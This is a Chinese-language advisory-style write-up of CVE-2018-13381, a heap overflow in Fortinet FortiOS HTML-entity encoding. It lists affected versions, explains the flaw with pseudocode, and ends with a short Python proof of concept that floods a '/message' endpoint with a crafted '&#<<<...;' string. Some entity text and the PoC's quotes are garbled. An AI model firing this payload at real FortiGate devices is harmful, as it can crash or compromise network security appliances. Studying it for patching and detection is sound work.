# （CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2947](https://www.zhihuifly.com/t/topic/2947)

# （CVE-2018-13381）Fortinet FortiOS 缓冲区错误漏洞

## 一、漏洞简介

Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。

## 二、漏洞影响

Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8

## 三、复现过程

在编码HTML实体代码时，有两个阶段。服务器首先计算编码字符串所需的缓冲区长度，然后将其编码到缓冲区。在计算阶段，例如，`<`字符编码为 `<`，占用5个字节。如果遇到任何以`&#`开头的字符，例如`<`，服务器会认为这个token已经被编码了，并直接计算其长度。像这样：

```
c = token[idx];
if (c == '(' || c == ')' || c == '#' || c == '<' || c == '>')
    cnt += 5;
else if(c == '&' && html[idx+1] == '#')
    cnt += len(strchr(html[idx], ';')-idx); 
```

然而，长度计算和编码过程之间将存在不一致，编码部分无法处理这种情况。

```
switch (c)
{
    case '<':
        memcpy(buf[counter], "&#60;", 5);
        counter += 4;
        break;
    case '>':
    // ...
    default:
        buf[counter] = c;
        break;
    counter++;
} 
```

如果我们输入恶意字符串如`&#<<<;`，`<`仍将编码成`<`，所以编码结果应该是`&#<<<;`！这比预期的6个字节长得多，从而导致堆溢出。
PoC：

```
import requests `data = {

‘title’: ‘x’,

‘msg’: ‘&#’ + ‘<’*(0x20000) + ‘;<’,

}

r = requests.post(‘[https://www.0-sec.org:4433/message](https://www.0-sec.org:4433/message)’, data=data)` 
```